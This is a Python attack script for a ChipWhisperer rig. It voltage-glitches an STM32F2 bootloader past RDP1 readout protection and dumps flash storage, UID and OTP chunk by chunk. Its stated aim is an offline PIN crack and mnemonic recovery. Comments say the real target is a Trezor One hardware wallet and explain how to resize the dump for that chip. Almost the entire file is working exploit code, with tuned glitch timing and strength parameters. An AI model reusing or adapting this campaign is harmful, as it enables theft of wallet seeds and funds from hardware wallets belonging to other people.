#!/usr/bin/env python
"""RDP1 glitch campaign -> full memory dump (was glitch2_campaign).

Stage-2 attack on the STM32F2 system bootloader: voltage-glitch the RDP1
readout refusal, and on the first ACK dump the whole storage sector for the
offline PIN brute-force chain (full_recover.py: storage 16KB @ 0x08008000
+ OTP3 + UID -> PIN -> mnemonic, self-checked against known-answer.json).

Target state (all proven on this rig): RDP1 chip, planted storage with known
PIN/seed at 0x08008000, bootloader syncs (0x7F->79), Read Memory NACKs (1F).

Attack: send the Read Memory command pair (0x11 0xEE) as one UART burst; TIO3
(tee'd on the FTDI TX line) gives an edge-locked trigger; the crowbar pulse
into VCAP (SMA on pads 31/47, short lead) fires ext_offset cycles later.
The RDP refusal happens after the 2-byte pair (~191 us burst; ~178 us past
the first rising edge) + processing - sweep just past that.

SUCCESS = ACK (0x79) instead of NACK -> immediately complete the Read Memory
exchange (addr 0x08008000, N=256) and verify the canary 4e524332 / 02 00 3C 00.

KEY PARAMETERS - SMA / crowbar mode (G_CROWBAR=1 default since 2026-10-27):
  G_CROWBAR=1            ARM the onboard MOSFET crowbar (glitch_hp=True +
                         vglitch_reset() errata release after every shot).
                         WITHOUT it the SMA carries only mV-scale gate
                         residue - ~6000 shots fired into disabled FETs
                         (FINDINGS 2026-10-27) were all no-ops.
  G_LP=1 (default on)   ALSO arm glitch_lp - hp+lp together = strongest
                         pull (newae forum 2668); part of the SWD-proven
                         strength set. If CLKGEN changes, rescale
                         EXT_MIN/MAX (ext units = clkgen cycles!).
  G_OUTPUT=enable_only   ONE continuous repeat-cycle crowbar pulse (width/
                         offset ignored, newae forum 2668). SWD-PROVEN mode:
                         the backup flash dumpers ran 100 MHz enable_only
                         hp+lp repeat 5/10. CAUTION: static-latched gates +
                         100 MHz killed a chip 2026-10-26 - keep repeat <=10.
  G_CLKGEN=119047619     119.05 MHz -> ext step ~8.4 ns; pulse = rep x that
  G_RND_REP=1 (default)  randomize strength EVERY shot: uniform pulse
  G_RND_LO=20 G_RND_HI=45  width in [LO,HI] nm (Kesenheimer-style 2D
                         search: ext grid x random strength). G_RND_REP=0
                         -> fixed G_REPEATS ladder instead.
  G_REPEATS=5            strength knob (fixed mode): 5 cycles = 30.0 ns
                         Ladder (full-gap passes): 39nm = 1.7% dead,
                         flips ~1/14,000 (hammer39: 0/600 at hot points;
                         LA-verified no 79-after-burst - flips may be
                         reset-conditioned); 40nm = 3.4% dead, 0/13500;
                         41nm = ~5.7% dead; 42nm = 7.5% dead, ALL known
                         flips (8 real + zombie, ~1/1416); 45nm = 14.3%;
                         46nm+ = kill floor. 42nm = THE collection
                         strength (user decision 2026-10-28).
  G_US_MIN=179 G_US_MAX=183   window in US after the TIO3 edge = THE FLIP
                         BAND: all 5 ACK_NO_DATA flips ever recorded landed
                         at 179-182us (45nm x2, 42nm x3). Early window is
                         kill-only dead weight - do not sweep it. Cycles
                         derive from clkgen; G_EXT_* raw cycles override.
  G_WIDTH=5              (inert in enable_only; single value = one PR write)
  G_OFFSET=-45           (inert in enable_only; recipe value)
  G_SAMPLES=1 G_TAG=...
  launch: python rdp1_glitch_campaign_full_mem_dump.py        # all defaults
  override: G_EXT_MIN=.. G_EXT_MAX=.. G_WIDTH=.. G_REPEATS=.. G_TAG=.. \
            python rdp1_glitch_campaign_full_mem_dump.py

BOOTLOADER CONTROL - we own the boot pins through the CW:
  TIO1 = BOOT0 (True -> system bootloader; low/hi-Z with empty flash ->
        core executes garbage at 0xFFFFFFFE and locks up - NOT the bootloader)
  TIO4 = NRST (gpio_low ~20 ms pulse = reset)
  TIO2 = high_z, io.target_pwr = target supply MOSFET
  VERIFIED boot recipe: hold TIO1 True, io.target_pwr False 1.5 s -> True,
  wait ~3 s, then 0x7F on UART -> 0x79. NRST alone is NOT reliable out of
  lockup; always power-cycle with BOOT0 high. After a mid-session crash,
  resync only after that full reboot (0x7F mid-session is ignored).

Fast loop: after a plain NACK the bootloader session is alive - retry without
rebooting. After a crash (no response) - power-cycle and re-sync.

KNOWN-BASELINE GATE (2026-10-27): fired only when chip state is genuinely
UNKNOWN - after any dead/weird verdict, at campaign start, after a rig
drop. The gate: an UNGLITCHED 0x11 0xEE probe must NACK (0x1F) = bootloader
alive + RDP1 still armed + UART nominal. Recovery ladder: NRST resync
first, full power cycle (BOOT0 high) if the probe still fails. A plain
NACK needs no probe - the correct 0x1F answer IS the baseline proof, so
healthy streaks run at full speed. An UNGlitchED ACK means the bypass
persisted in-session - the read completes with no glitch.
"""
import atexit
import csv
import os
import random
import signal
import sys
import threading
import time
from datetime import datetime

import serial

import chipwhisperer as cw

from serialfind import find_ftdi

UART = find_ftdi()
# ---- FULL-DUMP COLLECTOR: every flip reads the NEXT MISSING chunk ----
# One flip = one transaction (the next 0x11 NACKs - verified 2026-10-28),
# so the full prize costs one flip per chunk. Priority: storage head (the
# old canary chunk - informational only, real chips have no canary), UID,
# OTP3, then the rest of the storage sector.
#
# *** CHIP-SPECIFIC TARGET LIST - DO NOT REUSE AS-IS ON THE TREZOR ***
# These 66 chunks are sized for the PRACTICE chip ONLY. It is a DIFFERENT,
# SMALLER-memory part than the Trezor One: this collection covers just its
# 16 KB planted storage region + uid + otp3. On the real Trezor One chip
# (larger flash) the dump must cover the FULL memory / full storage span:
# resize STORAGE_BASE + STORAGE_LEN to the Trezor's layout (uid/otp3
# addresses stay the same) and TARGETS regenerates. Cost scales linearly:
# every extra 256 B chunk costs ~1 more successful flip (~1/1400 shots
# each at 2026-10-28 rates) - budget the campaign accordingly.
STORAGE_BASE, STORAGE_LEN = 0x08008000, 0x4000    # PRACTICE-chip values
TARGETS = ([('storage_0000', STORAGE_BASE, 256)]
           + [('uid', 0x1FFF7A10, 12), ('otp3', 0x1FFF7860, 32)]
           + [(f'storage_{i:04d}', STORAGE_BASE + 256 * i, 256)
              for i in range(1, STORAGE_LEN // 256)])

if os.environ.get('G_TARGETED'):
    # NORCOW (storage v2, fw 1.7+ incl 1.13.1): all secrets live in the
    # dict HEAD at 0x08008000, entries sequential: PIN_LOGS(0x0001),
    # EDEK_PVC(0x0002, salt + encrypted DEK/SAK + poly1305 tag = complete
    # offline-PIN-crack material), VERSION, then app entries incl the
    # encrypted mnemonic. Practice image confirms: all data in first 3
    # chunks (61/64 all-FF). MKesenheimer's +0x190/+0x290 offsets are
    # storage-v1 (fw 1.6.x) ONLY - do NOT use for v2. 5 chunks = 1.25 KB
    # covers the dict head with 2x margin; norcow parse offline flags
    # any entry straddling the end -> extend then.
    _n = int(os.environ.get('G_TARGETED_N', 5))
    # list is [storage_0000, uid, otp3, storage_0001..]: take storage head
    # (0000..N-1 = TARGETS[0] + TARGETS[3:3+N-1]) plus uid/otp3 (cheap wins,
    # useful for phase-2 RDP2 regression checks later)
    _head = [TARGETS[0]] + TARGETS[3:3 + _n - 1]
    TARGETS = _head + TARGETS[1:3]
CUR = [TARGETS[0]]          # [(name, addr, nbytes)] - what the NEXT flip reads
DONE = {}                   # name -> bytes collected this run (see G_RESUME)
DUMP_DIR = None             # dumps/run_YYYYmmdd_HHMMSS/, set in main()
ORACLE = None               # practice ground truth (storage.bin), if present


def validate_payload(data, nbytes):
    """Zombie check - deliberately ASYMMETRIC so it can never get stuck:
    - exact length required (short read = core died mid-transfer)
    - all-0x00 = ZOMBIE: dead TX line, or PCROP/SPRMOD latch corruption
      (jerinsunny.github.io/stm32_vglitch, STM32F4: glitch sets SPRMOD ->
      handshake ACKs but flash data reads return 0x00). Either way: retry.
    - all-0xFF = GENUINE: erased flash. 61/66 chunks legitimately read as
      FF x N (storage tail padding, possibly otp3) - rejecting them would
      deadlock the collector. NEVER reject 0xFF.
    """
    return (data is not None and len(data) == nbytes
            and data != b'\x00' * nbytes)

WIDTHS  = [int(x) for x in os.environ.get('G_WIDTH', '5').split(',')]
OFFSET  = int(os.environ.get('G_OFFSET', -45))
CLKGEN  = float(os.environ.get('G_CLKGEN', 166666667))  # 166.67MHz: rep5 = 30.0ns (user pick 2026-10-29); ext step ~6.0ns
OUTPUT  = os.environ.get('G_OUTPUT', 'enable_only')  # enable_only = ONE
         # continuous repeat-cycle crowbar pulse - the SWD-PROVEN mode
         # (backup dumpers: 100MHz enable_only hp+lp rep 5/10). glitch_only
         # = separate width/offset-shaped pulses (see newae forum 2668).
CROWBAR = os.environ.get('G_CROWBAR', '1') == '1'   # arm glitch_hp MOSFET -
         # without it the SMA never pulls the rail (FINDINGS 2026-10-27)
LP_ARM  = os.environ.get('G_LP', '1') == '1'        # ALSO arm glitch_lp:
         # hp+lp together = strongest crowbar pull (newae forum 2668);
         # part of the SWD-proven strength set - default ON
REPEATS = [int(x) for x in os.environ.get('G_REPEATS', '5').split(',')]
# RANDOMIZED STRENGTH (Kesenheimer-style 2D search): re-roll pulse width
# every shot, uniform in [G_RND_LO, G_RND_HI] ns. 0 disables (fixed ladder).
RND_REP = os.environ.get('G_RND_REP', '1') == '1'
RND_LO_NS = float(os.environ.get('G_RND_LO', 20))   # nm low end
RND_HI_NS = float(os.environ.get('G_RND_HI', 45))   # nm high end
# RDP decision window (user notes + LA 2026-10-27): sweet spot = the gap
# right AFTER the 0xEE stop bit ends (~+173us TIO3) and BEFORE the NACK
# starts (~+187us TIO3) -> default 173-187us = the full decision gap.
# Window is given in MICROSECONDS and converted to clkgen cycles here, so
# clkgen can be retuned for strength without hand-rescaling (old trap: cycle
# literals silently sliding the window ~18us on a clkgen change).
# G_EXT_MIN/G_EXT_MAX (raw cycles) override when explicitly set.
US_MIN = float(os.environ.get('G_US_MIN', 175))  # window start, us past TIO3 (hot zone head)
US_MAX = float(os.environ.get('G_US_MAX', 192))  # window end, us past TIO3 (NACK tail)
EXT_MIN = int(float(os.environ.get('G_EXT_MIN', US_MIN * CLKGEN / 1e6)))
EXT_MAX = int(float(os.environ.get('G_EXT_MAX', US_MAX * CLKGEN / 1e6)))
if os.environ.get('G_US_STEP'):
    # coarse scouts specced in us (e.g. 0.1), converted to nearest whole
    # clkgen cycle - at 128.21MHz, 0.1us -> 13 cycles = 101ns
    STEP = max(1, round(float(os.environ.get('G_US_STEP')) * CLKGEN / 1e6))
else:
    STEP = int(os.environ.get('G_STEP', 1))
# Hammer exact ext offsets (comma list, e.g. G_EXTS=21398,21686): overrides
# the range sweep - used to re-strike known-winning offsets.
EXTS = [int(x) for x in os.environ.get('G_EXTS', '').split(',') if x.strip()]
SAMPLES = int(os.environ.get('G_SAMPLES', 3))  # shots per grid point
SHOTS_MAX = int(os.environ.get('G_SHOTS', 15000))  # fits band farm 479pts x 30 (14370)
COOLDOWN = float(os.environ.get('G_COOLDOWN', 0.15))
RESET_EVERY = int(os.environ.get('G_RESET_EVERY', 1))  # 1 = reset+resync
#   EVERY shot (Kesenheimer one-shot-per-boot, default 2026-10-29); 0 = off
REST_EVERY = int(os.environ.get('G_REST_EVERY', 300))
REST_S  = float(os.environ.get('G_REST_S', 10))

CANARY_MAGIC = bytes.fromhex('4e524332')      # 'NRC2' LE at 0x08008000

scope = None
ser = None
_torn = False


def teardown(*_):
    global _torn
    if _torn:
        return
    _torn = True
    for attr, val in (('glitch_hp', False), ('glitch_lp', False),
                      ('target_pwr', False), ('nrst', 'high_z')):
        try:
            setattr(scope.io, attr, val)
        except Exception:
            pass
    try:
        scope.dis()
    except Exception:
        pass


atexit.register(teardown)
signal.signal(signal.SIGINT, teardown)
signal.signal(signal.SIGTERM, teardown)


def boot_and_sync(fast=True):
    """Recover the bootloader session. NRST pulse = ~350ms; power cycle =
    ~4.5s fallback (also used for the initial boot)."""
    if fast:
        scope.io.tio4 = 'gpio_low'
        time.sleep(0.02)
        scope.io.tio4 = 'high_z'
    else:
        scope.io.tio1 = True
        scope.io.tio2 = 'high_z'
        scope.io.target_pwr = False
        time.sleep(1.5)
        scope.io.target_pwr = True
        time.sleep(3)
        # re-latch crowbar drivers after power events: the glitch_hp gate
        # drive must be re-armed (FINDINGS 2026-10-26/27). CROWBAR mode arms
        # hp for glitch_only; G_LATCH keeps the legacy enable_only+lp variant.
        if CROWBAR:
            scope.io.glitch_hp = False; scope.io.glitch_hp = True
            if LP_ARM:
                scope.io.glitch_lp = False; scope.io.glitch_lp = True
        if OUTPUT == 'enable_only' and os.environ.get('G_LATCH') == '1':
            scope.io.glitch_hp = False; scope.io.glitch_hp = True
            scope.io.glitch_lp = False; scope.io.glitch_lp = True
    for _ in range(8):
        _kick()
        ser.reset_input_buffer()
        ser.write(b'\x7f')
        if b'\x79' in ser.read(8):
            return True
        time.sleep(0.05)
    return False


def complete_read():
    """Command got ACKed - finish the Read Memory exchange for the CURRENT
    collector target (CUR). Returns (bytes, None) or (None, note)."""
    _name, addr, nbytes = CUR[0]
    ab = addr.to_bytes(4, 'big')
    ser.write(ab + bytes([ab[0] ^ ab[1] ^ ab[2] ^ ab[3]]))
    r = ser.read(8)
    if not r or r[0] != 0x79:
        return None, f'addr stage refused: {r.hex() if r else "(nothing)"}'
    n1 = nbytes - 1
    ser.write(bytes([n1, n1 ^ 0xFF]))
    r = ser.read(nbytes + 16)
    if not r or r[0] != 0x79:
        return None, f'len stage refused: {r.hex()[:16] if r else "(nothing)"}'
    return r[1:1 + nbytes], None


def save_chunk(name, data, meta):
    open(os.path.join(DUMP_DIR, name + '.bin'), 'wb').write(data)
    with open(os.path.join(DUMP_DIR, 'manifest.txt'), 'a') as mf:
        mf.write(meta + '\n')


def next_target():
    for t in TARGETS:
        if t[0] not in DONE:
            return t
    return None


def chain_unglitched():
    """Right after a flipped read: probe whether the bypass latched for the
    session (an UNGLITCHED 0x11 pair ACKs). If it did, drain every
    remaining chunk in one go. Returns True only on FULL collection."""
    drained = 0
    while True:
        t = next_target()
        if t is None:
            return True
        ser.reset_input_buffer()
        ser.write(b'\x11\xee')
        r = ser.read(8)
        if not r or 0x79 not in r:
            return drained > 0
        CUR[0] = t
        data, note = complete_read()
        if data is None:
            return drained > 0
        DONE[t[0]] = data
        save_chunk(t[0], data, f'{datetime.now():%H:%M:%S} LATCHED {t[0]}')
        drained += 1
        print(f'  [LATCHED+] {t[0]} drained '
              f'({len(DONE)}/{len(TARGETS)} chunks)', flush=True)


def assemble_and_report():
    """Write assembled outputs + coverage report into DUMP_DIR."""
    if next_target() is None:
        storage = b''.join(DONE[f'storage_{i:04d}']
                           for i in range(STORAGE_LEN // 256))
        open(os.path.join(DUMP_DIR, 'storage_dump.bin'), 'wb').write(storage)
        if 'uid' in DONE:
            open(os.path.join(DUMP_DIR, 'uid.hex'), 'w').write(
                DONE['uid'].hex() + '\n')
        if 'otp3' in DONE:
            open(os.path.join(DUMP_DIR, 'otp3.hex'), 'w').write(
                DONE['otp3'].hex() + '\n')
        print('[***] FULL COLLECTION COMPLETE - storage_dump.bin, uid.hex,'
              ' otp3.hex written', flush=True)
    print(f'[=] collected {len(DONE)}/{len(TARGETS)} chunks -> {DUMP_DIR}',
          flush=True)


LAST_W = LAST_O = None


# ---- watchdog: USB-serial disconnects can wedge pyserial's poll forever;
# if no progress for 60 s, hard-exit so the hammer loop relaunches cleanly.
_progress = [time.time()]
_flat = [0]         # consecutive clean nacks (flatline detector)


def _watchdog():
    while True:
        time.sleep(10)
        if time.time() - _progress[0] > 60:
            print('  [watchdog] no progress for 60s - hard exit for relaunch',
                  flush=True)
            os._exit(3)


def _kick():
    _progress[0] = time.time()


def baseline_probe():
    """KNOWN-BASELINE gate probe: an UNGLITCHED 0x11 0xEE pair must NACK
    (0x1F). Proves bootloader alive + RDP1 still armed + UART nominal -
    i.e. the exact pre-shot state every glitch is fired from. 'unlocked'
    = it ACKed with NO glitch (bypass persisted in-session - jackpot)."""
    ser.reset_input_buffer()
    ser.write(b'\x11\xee')
    r = ser.read(8)
    if r and 0x79 in r:
        return 'unlocked'
    if r and 0x1F in r:
        return 'ok'
    return 'bad'


def baseline_then_shot(ext_offset, width, repeat):
    """Baseline gate + one glitched shot - used ONLY when the chip state is
    genuinely unknown: after any dead/weird verdict, at campaign start, and
    after a rig drop. A plain NACK needs no probe - the correct 0x1F answer
    IS the baseline proof (alive + RDP1 armed + UART nominal)."""
    for _round in range(3):
        st = baseline_probe()
        if st == 'ok':
            return attempt(ext_offset, width, repeat)
        if st == 'unlocked':
            print('  [baseline] *** UNGLITCHED ACK - RDP bypass persisted!'
                  ' Completing read with no glitch. ***', flush=True)
            payload, note = complete_read()
            if payload and not validate_payload(payload, CUR[0][2]):
                return 'zombie', None, note or 'zombie payload'
            return ('SUCCESS' if payload else 'ACK_NO_DATA'), payload, \
                note or ''
        print(f'  [baseline] not at known baseline ({st}) -> recovering',
              flush=True)
        if _round == 0:
            ok = boot_and_sync(fast=True)      # cheap NRST resync first
        else:
            ok = boot_and_sync(fast=False)     # hard power-cycle baseline
        if not ok and not reconnect():
            raise IOError('baseline recovery failed')
    raise IOError('baseline probe failed 3x - refusing to guess')


def attempt(ext_offset, width, repeat):
    """One shot. Returns (verdict, payload, note)."""
    global LAST_W, LAST_O
    g = scope.glitch
    # width/offset writes trigger FPGA partial-reconfig + DCM reset - a known
    # hang risk (NewAE forum) and slow. Only write when the value changes.
    if width != LAST_W:
        g.width = width
        LAST_W = width
    if OFFSET != LAST_O:
        g.offset = OFFSET
        LAST_O = OFFSET
    g.ext_offset = ext_offset
    g.repeat = repeat
    scope.arm()
    ser.reset_input_buffer()
    ser.write(b'\x11\xee')            # the burst TIO3 triggers on
    r = ser.read(32)                  # NACK / ACK / silence
    if CROWBAR:
        try:
            scope.io.vglitch_reset()  # errata: FETs can stick ON (latch kept)
        except Exception:
            pass
    if r and 0x79 in r:
        data, note = complete_read()
        if data:
            if validate_payload(data, CUR[0][2]):
                return 'SUCCESS', data, note or ''
            return 'zombie', None, (f'{note} ' if note else '') + \
                f'zero/short payload={data[:8].hex()}..'
        return 'ACK_NO_DATA', None, note
    if r and r.count(0x1F) >= 4:
        # 1f-FLOOD: chip stuck in an async NACK loop (2026-10-28 15:17:
        # 1600 'nacks' of 31x1f; LA showed 1fs flowing BEFORE our burst).
        # Needs a resync - not a clean verdict, must gate + reset flatline.
        return 'spam', None, f'{len(r)}B x1f-flood'
    if r and 0x1F in r:
        return 'nack', None, r.hex()
    if not r:
        return 'dead', None, ''
    return 'weird', None, r.hex()


def reconnect(tries=5):
    """Rebuild the CW + serial session after a USB dropout (the CW drops
    every ~12 min on this rig). Re-applies the full glitch/trigger config,
    then boots + syncs the target. Returns True when the rig is back."""
    global scope, ser, LAST_W, LAST_O
    for attr, val in (('glitch_hp', False), ('glitch_lp', False)):
        try:
            setattr(scope.io, attr, val)
        except Exception:
            pass
    try:
        scope.dis()
    except Exception:
        pass
    try:
        ser.close()
    except Exception:
        pass
    for attempt in range(tries):
        time.sleep(2.0)
        try:
            scope = cw.scope()
            try:
                import zipfile as _zf
                _fw = scope.scopetype.getFWConfig()
                _z = _zf.ZipFile(_fw.loader._bsBuiltinData)
                with open('/tmp/opencode/cwlite_interface.bit', 'wb') as _bf:
                    _bf.write(_z.read('cwlite_interface.bit'))
                scope.scopetype.reload_fpga('/tmp/opencode/cwlite_interface.bit')
            except Exception:
                pass
            scope.clock.clkgen_freq = CLKGEN
            g = scope.glitch
            g.clk_src = 'clkgen'
            g.output = OUTPUT
            g.trigger_src = 'ext_single'
            scope.trigger.triggers = 'tio3'
            scope.adc.basic_mode = 'rising_edge'

            scope.io.tio3 = 'high_z'
            scope.io.tio1 = True
            scope.io.tio2 = 'high_z'
            scope.io.tio4 = 'high_z'
            if CROWBAR:
                scope.io.glitch_hp = True   # re-arm after fresh CW open
                if LP_ARM:
                    scope.io.glitch_lp = True
            LAST_W = LAST_O = None          # force width/offset re-apply
            ser = serial.Serial(find_ftdi(), 115200, bytesize=8,
                                parity='E', stopbits=1, timeout=0.4)
            if boot_and_sync(fast=False):
                print(f'  [reconnect OK on try {attempt + 1}]', flush=True)
                return True
        except Exception as e:
            print(f'  [reconnect try {attempt + 1} failed: '
                  f'{type(e).__name__}]', flush=True)
    return False


def main():
    global scope, ser
    scope = cw.scope()
    scope.io.target_pwr = 'high_z'
    # Every fresh CW power-up makes the SAM3U load its OLD stored bitstream,
    # which mismatches the 6.0.0 partial-reconfig data (width knob dies).
    # Reprogram the FPGA from the package's matched bitstream+PR pair.
    try:
        import zipfile as _zf
        _fw = scope.scopetype.getFWConfig()
        _z = _zf.ZipFile(_fw.loader._bsBuiltinData)
        with open('/tmp/opencode/cwlite_interface.bit', 'wb') as _bf:
            _bf.write(_z.read('cwlite_interface.bit'))
        scope.scopetype.reload_fpga('/tmp/opencode/cwlite_interface.bit')
        print('[+] FPGA reloaded from 6.0.0 matched pair')
    except Exception as e:
        print(f'[!] FPGA reload skipped: {type(e).__name__} {e}')
    scope.clock.clkgen_freq = CLKGEN
    g = scope.glitch
    g.clk_src = 'clkgen'
    g.output = OUTPUT
    g.trigger_src = 'ext_single'
    scope.trigger.triggers = 'tio3'
    scope.adc.basic_mode = 'rising_edge'
    if OUTPUT == 'enable_only' and os.environ.get('G_LATCH') == '1':
        scope.io.glitch_lp = True      # legacy latch, opt-in via G_LATCH=1
        scope.io.glitch_hp = True
    if CROWBAR:
        scope.io.glitch_hp = True      # ARM the crowbar MOSFET (SMA pull)
        if LP_ARM:
            scope.io.glitch_lp = True  # second FET too - max pull (forum 2668)
        print('[+] CROWBAR ARMED: glitch_hp=True'
              + ('+glitch_lp (MAX pull)' if LP_ARM else '')
              + ' (vglitch_reset release after every shot)')
    scope.io.tio3 = 'high_z'

    ser = serial.Serial(UART, 115200, bytesize=8, parity='E',
                        stopbits=1, timeout=0.4)

    if not boot_and_sync(fast=False):
        teardown(); sys.exit('no sync to start')
    print(f'[+] STRENGTH: {OUTPUT} @ {CLKGEN/1e6:g} MHz clkgen, FETs '
          f'hp{"+lp" if LP_ARM else ""}, pulses: '
          + ', '.join(f'rep{r}={r / CLKGEN * 1e9:.1f}ns' for r in REPEATS),
          flush=True)
    print(f'[+] synced. sweep ext {EXT_MIN}-{EXT_MAX} step {STEP} '
          f'widths {WIDTHS} offset {OFFSET} repeats {REPEATS}')
    threading.Thread(target=_watchdog, daemon=True).start()

    tag = os.environ.get('G_TAG', '')
    log_path = os.path.join(
        'campaigns',
        f'glitch2_{datetime.now():%Y%m%d_%H%M%S}'
        + (f'_{tag}' if tag else '') + '.csv')
    logf = open(log_path, 'w', newline='')
    logw = csv.writer(logf)
    logw.writerow(['config', CLKGEN, OFFSET, ','.join(map(str, WIDTHS)),
                   ','.join(map(str, REPEATS)), EXT_MIN, EXT_MAX, tag])
    logw.writerow(['shot', 'ext_offset', 'us', 'width', 'repeat', 'verdict', 'note'])

    global DUMP_DIR, ORACLE
    DUMP_DIR = os.path.join('dumps', f'run_{datetime.now():%Y%m%d_%H%M%S}')
    os.makedirs(DUMP_DIR, exist_ok=True)
    if os.path.isfile('storage.bin'):
        ORACLE = open('storage.bin', 'rb').read()
        print(f'[+] practice oracle: storage.bin ({len(ORACLE)} B, '
              f'informational compare)', flush=True)
    resume = os.environ.get('G_RESUME', '')
    if resume and os.path.isdir(resume):
        for t in TARGETS:
            p = os.path.join(resume, t[0] + '.bin')
            if os.path.isfile(p):
                DONE[t[0]] = open(p, 'rb').read()
        t = next_target()
        if t:
            CUR[0] = t
        print(f'[+] resumed {len(DONE)} chunks from {resume}, next: '
              f'{CUR[0][0]}', flush=True)
    print(f'[+] collector: {len(TARGETS)} chunks (16 KB storage + uid + '
          f'otp3), first target {CUR[0][0]} @ 0x{CUR[0][1]:08X}, '
          f'outdir dumps/run_*', flush=True)

    shot = 0
    t0 = time.time()
    need_baseline = True      # verify once at campaign start
    PASSES = int(os.environ.get('G_PASSES', 1))  # X passes through the grid
    _grid_n = len(EXTS) if EXTS else len(range(EXT_MIN, EXT_MAX + 1, STEP))
    total_shots = _grid_n * SAMPLES * PASSES

    def _passes():
        for _p in range(1, PASSES + 1):
            if PASSES > 1:
                print(f'[=] pass {_p}/{PASSES} through the grid '
                      f'({EXT_MIN}-{EXT_MAX} ext)', flush=True)
                try:
                    boot_and_sync(fast=True)   # fresh baseline between passes
                except Exception:
                    pass
            for e in (EXTS if EXTS else range(EXT_MIN, EXT_MAX + 1, STEP)):
                yield e

    _rep_lo = max(1, round(RND_LO_NS * CLKGEN / 1e9))
    _rep_hi = max(_rep_lo, round(RND_HI_NS * CLKGEN / 1e9))

    for ext in _passes():
        for width in WIDTHS:
            for repeat in (REPEATS if not RND_REP else [REPEATS[0]]):
                for _sample in range(SAMPLES):
                    if RND_REP:
                        # strength re-roll: uniform random pulse width in
                        # [RND_LO_NS, RND_HI_NS] (default 20-45nm), the
                        # other axis of the 2D search alongside the ext grid
                        repeat = random.randint(_rep_lo, _rep_hi)
                    # rig-drop recovery: any USB/CW/serial exception during a
                    # shot -> rebuild the session, RESUME at the same point.
                    try:
                        _kick()
                        if need_baseline:
                            verdict, payload, note = baseline_then_shot(
                                ext, width, repeat)
                        else:
                            verdict, payload, note = attempt(ext, width,
                                                             repeat)
                        # unknown state after these -> gate the next shot
                        need_baseline = verdict in ('dead', 'weird',
                                                    'ACK_NO_DATA',
                                                    'zombie', 'spam')
                    except Exception as e:
                        print(f'  [rig-drop] {type(e).__name__} at '
                              f'ext={ext * 1e6 / CLKGEN:.1f}us rep={repeat} '
                              f'-> reconnect', flush=True)
                        if not reconnect():
                            teardown(); sys.exit(f'rig lost after rig-drop: {e}')
                        need_baseline = True   # rebuilt session -> re-verify
                        continue          # same grid point, next stochastic roll
                    shot += 1
                    logw.writerow([shot, ext, round(ext * 1e6 / CLKGEN, 2),
                                   width, repeat, verdict, note])
                    # live per-shot verdict (every glitch, not just heartbeats)
                    _ns = (f'={repeat / CLKGEN * 1e9:.1f}ns'
                           if OUTPUT == 'enable_only' else '')
                    _pct = 100.0 * shot / total_shots if total_shots else 0.0
                    print(f'  [{datetime.now():%H:%M:%S}] #{shot} '
                          f'({_pct:.0f}%) '
                          f'ext={ext} ({ext * 1e6 / CLKGEN:.1f}us) '
                          f'w{width} r{repeat}{_ns} -> {verdict}'
                          + (f' ({note})' if note else ''), flush=True)
                    # SUCCESS check MUST be inside the sample loop: payload
                    # is overwritten by the next shot. (Bug 2026-10-28: 8
                    # SUCCESS dumps swallowed by the SAMPLES loop, lost.)
                    # COLLECTOR: each flip banks the chunk it read, probes
                    # for a session-latch, then farms the next chunk.
                    if verdict == 'SUCCESS':
                        name, addr, _n = CUR[0]
                        oracle = ''
                        if ORACLE and addr >= STORAGE_BASE \
                                and addr - STORAGE_BASE < len(ORACLE) \
                                and len(payload) == _n:
                            seg = ORACLE[addr - STORAGE_BASE:
                                         addr - STORAGE_BASE + _n]
                            oracle = ('MATCH' if seg == payload else
                                      f'MISMATCH exp={seg[:8].hex()}..')
                        if oracle.startswith('MISMATCH'):
                            # GHOST READ: handshake OK but flash returned
                            # erase-pattern for a region that holds data
                            # (2026-10-28: storage_0000 banked all-FF,
                            # oracle caught it). NOT banked - retry chunk.
                            # Real chips have no oracle: use cross-read
                            # consistency there.
                            open(os.path.join(DUMP_DIR, name + '.bad.bin'),
                                 'wb').write(payload)
                            print(f'  [!] GHOST READ {name}: oracle '
                                  f'{oracle} - saved .bad.bin, NOT banked,'
                                  f' retrying chunk', flush=True)
                            logf.flush()
                            _flat[0] = 0
                        else:
                            DONE[name] = payload
                            save_chunk(name, payload,
                                       f'{datetime.now():%H:%M:%S} shot#{shot} '
                                       f'ext={ext} ({ext * 1e6 / CLKGEN:.1f}us) '
                                       f'{name} first16={payload[:16].hex()} '
                                       f'{oracle}')
                            if oracle:
                                print(f'      practice-oracle: {oracle}',
                                      flush=True)
                        print(f'\n[***] CHUNK SECURED  {name} '
                              f'({len(payload)} B @ 0x{addr:08X}) '
                              f'ext={ext} ({ext * 1e6 / CLKGEN:.1f}us)\n'
                              f'      first16: {payload[:16].hex()}', flush=True)
                        if name == 'storage_0000' and \
                                payload[:4] == CANARY_MAGIC:
                            print('      canary match - practice storage '
                                  '(informational only)', flush=True)
                        if chain_unglitched():
                            assemble_and_report()
                            logf.flush()
                            teardown()
                            return
                        t = next_target()
                        if t:
                            CUR[0] = t
                        print(f'      collector -> next chunk {CUR[0][0]} '
                              f'({len(DONE)}/{len(TARGETS)} banked, '
                              f'farming continues)', flush=True)
                        logf.flush()
                    # flatline detector: a firing crowbar disturbs ~5% of
                    # shots at these strengths. Hundreds of clean nacks in
                    # a row = pulses not landing (ghost session
                    # 2026-10-28 00:02: 10740 clean nacks, 0 disturbance
                    # after kill-9 + USB reset; healed on next fresh open).
                    if verdict == 'nack':
                        _flat[0] += 1
                        if _flat[0] == 400:
                            print('  [!!] 400 clean nacks in a row - crowbar'
                                  ' may be silent', flush=True)
                        if _flat[0] == 800:
                            print('  [!!] 800 clean nacks - re-arming FETs',
                                  flush=True)
                            try:
                                scope.io.glitch_hp = False
                                scope.io.glitch_hp = True
                                scope.io.glitch_lp = False
                                scope.io.glitch_lp = True
                            except Exception:
                                pass
                        if _flat[0] >= 1600:
                            print('  [!!] 1600 clean nacks - hard exit for'
                                  ' fresh relaunch', flush=True)
                            logf.flush()
                            teardown()
                            os._exit(4)
                    else:
                        _flat[0] = 0
                if verdict in ('dead', 'ACK_NO_DATA', 'weird', 'zombie', 'spam'):
                    print(f'  [{verdict}] ext={ext * 1e6 / CLKGEN:6.1f}us '
                          f'rep={repeat} {note} -> resync', flush=True)
                    try:
                        ok = boot_and_sync(fast=True) or boot_and_sync(fast=False)
                    except Exception:
                        ok = False
                    if not ok:
                        if not reconnect():
                            teardown(); sys.exit('target/rig lost after resync')
                # 1-shot-per-boot (Kesenheimer methodology, 2026-10-29):
                # reset + fresh sync every N shots REGARDLESS of verdict -
                # flips may be reset-conditioned (boot-to-boot HSI
                # alignment). Their rig does exactly this every shot.
